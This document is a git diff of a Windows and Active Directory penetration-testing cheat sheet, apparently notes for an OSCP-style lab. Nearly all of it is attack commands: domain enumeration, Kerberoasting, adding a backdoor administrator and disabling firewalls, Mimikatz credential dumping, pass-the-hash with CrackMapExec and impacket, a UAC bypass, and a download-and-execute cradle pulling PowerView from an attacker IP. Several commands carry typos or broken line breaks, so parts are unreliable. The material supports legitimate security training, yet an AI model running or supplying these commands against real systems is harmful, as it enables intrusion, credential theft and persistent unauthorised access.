@@ -43,7 +43,7 @@ There are several key pieces of information we should always obtain:
 > Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 > Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
 # If you get access to the machine through another user, then restart the file search, as permissions may have changed
-> Get-ChildItem -Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue | type # Great, but only for CTFs, probably shouldn't get used to it
+> Get-ChildItem -Path C:\ -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue | type # Great, but only for CTFs, probably shouldn't get used to it
 > findstr /spin “password” *.* # find all files with the word "password" in them
 > Get-History
 > (Get-PSReadlineOption).HistorySavePath
@@ -76,15 +76,21 @@ powershell -ep bypass
 > Get-UserProperty -Properties pwdlastset
 # See how many times each user has logged on, great way to identify honeypot accounts
 > Get-UserProperty -Properties logoncount
+# See who can RDP
+> Get-NetGroupMember "Remote Desktop Users"
 # Enumerate the computer objects
 > Get-NetComputer
 # Get a ton of information about the computers
 > Get-NetComputer -FullData # '| select {propertyName}' in order to nail down certain information, such as operating system
 > Get-NetComputer | select operatingsystem,dnshostname # It's a good idea to grab this information early in the assessment to determine the relative age of the systems and to locate potentially weak targets.
+# Map a computer to an IP address
+> Resolve-IFAddress dev04.medtech.com
 # Enumerate groups
 > Get-NetGroup | select cn
+# Get the groups of a user
+> Get-NetGroup -Username "jeff"
 # See who are admins
-> Get-NetGroupMember -GroupName *admin*
+> Get-NetGroupMember -GroupName *admin* -Recurse
 # Look through the different shares
 > Invoke-ShareFinder
 # Get the group policies, important one
@@ -94,7 +100,12 @@ powershell -ep bypass
 # Find out if you have admin privileges on any computers in the domain
 > Find-LocalAdminAccess # May take a few minutes
 # See who's logged in & other info
-> Get-NetSession -ComputerName web04 -Verbose # Untrustable on Windows 11
+> Get-NetSession -ComputerName web04 -Verbose # Untrustable on Wi
+ndows 11
+# This is more reliable, look for admins to be logged on machines, either to collect their NTLM hash or to impersonate commands running as him
+> .\PsLoggedOn.exe \\file04
+# Another way to get logged on users, needs local admins rights
+> Get-NetLoggedOn -ComputerName <servername>
 # We can obtain the IP address and port number of applications running on servers integrated with AD by simply enumerating all SPNs in the domain, meaning we don't need to run a broad port scan
 > Get-NetUser -SPN | select samaccountname,serviceprincipalname
 # See if we can perform an AS-REP Roast on any users
@@ -105,8 +116,10 @@ powershell -ep bypass
 > Get-ObjectAcl -Identity stephanie # Look for AD Rights, SIDs. SID2 has AD Rights to SID1
 # Convert SIDs to domain object name
 > Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
-# Clean output, look for all users with General All Rights for "Management Department"
-> Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights # Can also do this for GenericWrite,WriteOwner,WriteDACL,AllExtendedRights,ForceChangePassword,Self (Self-Membership)
+# Clean output, look for all users with General All Rights for either a user or group object, can change permissions and change their passwords if user
+> Get-ObjectAcl -Identity "Backup Operators" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights # Can also do this for GenericWrite,WriteOwner,WriteDACL,AllExtendedRights,ForceChangePassword,Self (Self-Membership)
+# Easier way to do the above
+> Find-InterestingDomainAcl # If you are GenericAll or Write privs, then you should simply add yourself to the group and inherit the rights associated 'net group "group_name" jimothy /add /domain', then rinse and repeat. Elevate your privileges as much as possible
 # Convert multiple SIDs to readable objects at once
 > "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName # If a regular user has these rights, this is likely a misconfiguration.. and should be prioritized
 # Find shares in the domain
@@ -122,7 +135,7 @@ Note that SharpHound supports looping, running cyclical queries over time like a
 ```bash
 > . .\Sharphound.ps1 # or Import-Module .\SharpHound.ps1
 > Get-Help Invoke-BloodHound
-> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\Public\\Desktop\ -OutputPrefix "web02" # May take a couple minutes
+> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public\Desktop\ -OutputPrefix "web02" # May take a couple minutes
 ```
 
 ```bash
@@ -140,7 +153,7 @@ It's a good idea to mark every object we have access to as owned to improve our 
 Use PsLoggedon.exe if it's an older machine, such as Server 2012 R2, 2016 (1607), 2019 (1809), and Server 2022 (21H2). Don't trust it if it says that nobody is logged on, but trust it if it says there is somebody.
 
 ```bash
-.\\PsLoggedOn.exe \\file04
+.\PsLoggedOn.exe \\file04
 ```
 
 #### Interesting Object Permissions
@@ -276,6 +289,9 @@ If we know the SPN  we want to target, we can request a service ticket for it fr
 We'll provide hashes.kerberoast as an argument for /outfile to store the resulting TGS-REP hash in. Since we'll execute Rubeus as an authenticated domain user, the tool will identify all SPNs linked with a domain user.
 
 ```bash
+# Sync the time
+net time \\dc01.corp.local /set
+Get-NetAdapter ethernet0* | Set-DnsClientServerAddress -ServerAddress @('192.168.45.213')
 # Method from Windows
 PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
@@ -326,16 +342,24 @@ PS C:\Tools> iwr -UseDefaultCredentials http://web04
 
 You can use this user to RDP into a session and obtain a GUI. This assumes that you are already NT Authority.
 ```bash
-net user /add backdoor Password1
-...
-net localgroup administrators /add backdoor
-...
+# Enable RDP
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+
+# Enables RDP Pass the Hash
+Net-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
+
 # Enables RDP Connections
-add "HTLM\SYSTEM\CurrentControlSet\Control\Terminal Server" \v "fDenyTSConnections" /t REG_DWORD /d 0 /f
+reg add "HTLM\SYSTEM\CurrentControlSet\Control\Terminal Server" \v "fDenyTSConnections" /t REG_DWORD /d 0 /f
 ...
 # Disable the Firewalls
 netsh advfirewall set allprofiles state off
 ...
+net user /add backdoor Password1
+...
+net localgroup administrators /add backdoor
+...
+net localgroup "Remote Desktop Users" backdoor /add
+
 # RDP In & Allow Clipboard Sharing
 xfreerdp /v:ms01 /u:backdoor /p:Password1 +x clipboard /cert:ignore
 ```
@@ -542,6 +566,7 @@ powershell -ep bypass
 
 # This function displays services the current user can modify, such as the service binary or configuration files.
 Get-ModifiableServiceFile
+Invoke-AllChecks
 ```
 
 ### Service DLL Hijacking
@@ -725,3 +750,119 @@ kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
 #### Privileges Mapped to Exploits Page, such as SeImpersonate
 
 "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens"
+
+#### Whenever you get a Shell
+
+```bash
+Start-Process -NoNewWindow -FilePath C:\Windows\Tools\shell.exe
+```
+
+#### UAC Bypass
+
+Check for this in PowerUp's Invoke-AllChecks output. Follow the steps listed in "https://github.com/CsEnox/EventViewer-UACBypass". For the command, execute a msfvenom payload for a proper reverse shell, such as
+
+```bash
+Invoke-EventViewer "C:\Windows\Tools\shell.exe"
+```
+
+#### When you Become Local Admin
+
+Run all MimiKatz commands and save the output:
+
+```bash
+.\mimikatz.exe
+token::elevate # Makes sure commands are run as system
+privilege::debug # Test if ^ is the case
+log
+sekurlsa::logonpasswords # Who has been on the host machine?
+lsadump::sam
+lsadump::secrets
+lsadump::cache
+```
+
+If you see a username with a "$" at the end, this is a machine account, and cracking these passwords are infeasable at the moment. Look for service to be in Users OU, not Servers.
+
+#### CrackMapExec 
+
+To see if anybody has the same hash or password on another computer in the network:
+
+```bash
+crackmapexec smb 10.10.10.15-24 -u '' -H 5bcoe56i4645ho43h2ei534rsat -d corp.com --continue-on-success
+
+# You can also use with a username, such as Administrator
+crackmapexec smb 10.10.10.15-24 -u 'Administrator' -H 5bcoe56i4645ho43h2ei534rsat --local-auth --lsa
+```
+
+Kerberos:
+```bash
+cat matthew.b64 | base64 -d > matthew.ccache
+export KRBCCNAME=$(pwd)/matthew.ccache
+klist
+
+proxychains -q crackmapexec smb corp.com --kerberos --continue-on-success # Must provide FQDNs
+
+# Use cme to list the domain
+proxychains -q crackmapexec smb 10.10.10.1X/24
+# Add the FQNs to a targets file
+...
+
+# Retrieve hashes from password
+proxychains crackmapexec smb dev02-corp -u Administrator -p Password123! --local-auth --lsa
+
+# Dump hashes for other users
+proxychains crackmapexec smb web02-corp -u Matthew.Lucas -H 5bcoe56i4645ho43h2ei534rsat --lsa
+```
+
+#### Force to Reset Password
+
+```bash
+# Import the PowerView module
+iex (new-object net.webclient).DownloadString('http://192.168.119.139/PowerView.ps1')
+
+# Convert the new password to a secure string                                  
+$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force      
+
+# Create a PSCredential object with an account that has permissions to reset   
+passwords                                                                      
+$Cred = New-Object System.Management.Automation.PSCredential                   
+('DomainName\UserName', (ConvertTo-SecureString 'FGjksdff89sdfj' -AsPlainText  
+-Force))                                                                       
+
+# Reset the password for the user 'nina'                                       
+Set-DomainUserPassword -Identity 'nina' -AccountPassword $UserPassword         
+-Credential $Cred -Verbose                                                     
+
+# If you need to set the password for another user, repeat the process with the correct details
+# For example, for a user named 'User.Name':
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('DomainName\User.Name', $SecPassword)
+
+# Reset the password                                                           
+Set-DomainUserPassword -Identity 'User.Name' -AccountPassword $UserPassword    
+-Credential $Cred -Verbose
+
+# Optionally, if you need to set a script path for the user object             
+# Replace <User.Name>, $ip, <file> with actual values                          
+Set-DomainObject -Identity 'User.Name' -Set                                    
+@{"scriptpath"="\\$ip\share\<file>.bat"} -Credential $cred -Verbose            
+```
+
+#### Executing Remote Commands
+
+```bash
+# With a ticket
+impacket-atexec -k admin02.corp.com "powershell -enc <command>"
+# With password
+impacket-psexec "web02/administrator:<password>@web02.corp.com" -c <path to binary>
+# Get a shell with ntlm hash
+impacket-psexec 'web02/administrator'@10.10.10.15 -hashes ':5bcoe56i4645ho43h2ei534rsat'
+# Dump secrets from kali machine
+impacket-secretsdump svcorp/pete 
+# Using evil win-rm with hash
+evil-winrm -i 10.10.10.15 -u pete -H 5bcoe56i4645ho43h2ei534rsat
+```
+
+#### Amazing Enumeration Cheatsheet
+
+https://wadcoms.github.io
+
